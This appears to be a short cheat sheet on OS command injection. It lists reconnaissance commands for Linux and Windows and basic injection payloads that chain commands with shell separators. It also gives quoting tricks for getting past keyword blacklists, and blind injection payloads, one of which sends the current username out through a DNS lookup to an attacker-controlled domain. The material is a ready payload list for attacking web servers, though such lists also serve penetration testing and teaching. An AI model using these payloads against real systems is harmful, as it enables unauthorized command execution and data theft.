Command Injection
-----------------------------------

OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.

Useful commands:  
-----------------------------------

Linux:    
whoami --- Name of current user.    
uname -a --- Operating system.    
ifconfig	--- Network configuration.    
netstat -an --- Network connections.   
ps -ef --- Running processes.	       

Windows:    
whoami --- Name of current user.    
ver --- Operating system.   
ipconfig /all --- Network configuration.   
netstat -an --- Network connections.   
tasklist --- Running processes.   

Basic payloads: 
-----------------------------------
```
valid_command ;ls      ---  Execute ls after valid_command
valid_command && ls    ---  Execute ls after if valid_command return 0(success)
valid_command | ls     ---  Sends the output of valid_command as input to ls
valid_command || ls    ---  Executes ls iff valid_command returns a nonzero exit status(error)
valid_command $(ls)    ---  Sends the output of ls as arguments to valid_command
valid_command `ls`     ---  Sends the output of ls as arguments to valid_command
```

Bypass Blacklisted words:
-----------------------------------
```
w'h'o'am'i
w"h"o"am"i
w\ho\am\i
/\b\i\n/////s\h
```

Blind command injection payloads:
-----------------------------------
```
& ping -c 10 127.0.0.1 &
& whoami > /var/www/static/whoami.txt &
& nslookup kgji2ohoyw.web-attacker.com &
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

References:
-----------------------------------
[Wikipedia](https://en.wikipedia.org/wiki/Code_injection)     
[Owasp](https://www.owasp.org/index.php/Command_Injection)   
